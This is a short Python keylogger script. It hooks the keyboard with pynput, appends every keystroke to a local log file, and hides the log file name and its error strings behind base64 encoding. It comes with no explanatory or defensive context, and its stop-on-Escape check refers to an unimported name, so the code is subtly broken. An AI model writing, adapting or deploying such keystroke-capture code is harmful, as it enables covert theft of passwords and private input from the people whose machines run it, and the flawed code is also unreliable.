import os
import base64
from ctypes import windll
def b64d(s): return base64.b64decode(s).decode()
log_file = b64d('a2V5bG9ncy50eHQ=')
def on_press(key):
    try:
        if hasattr(key, 'char') and key.char.isalnum():
            with open(log_file, 'a') as f:
                f.write(key.char)
        else:
            with open(log_file, 'a') as f:
                f.write(f' <{key.name}> ')
    except AttributeError:
        pass
    except IOError:
        windll.user32.MessageBoxW(0, b64d('RXJyb3Igd3JpdGluZyB0byBmaWxl'), b64d('RXJyb3I='), 1)
def on_release(key):
    if key == keyboard.Key.esc:
        return False
from pynput.keyboard import Listener as L
with L(on_press=on_press, on_release=on_release) as listener:
    listener.join()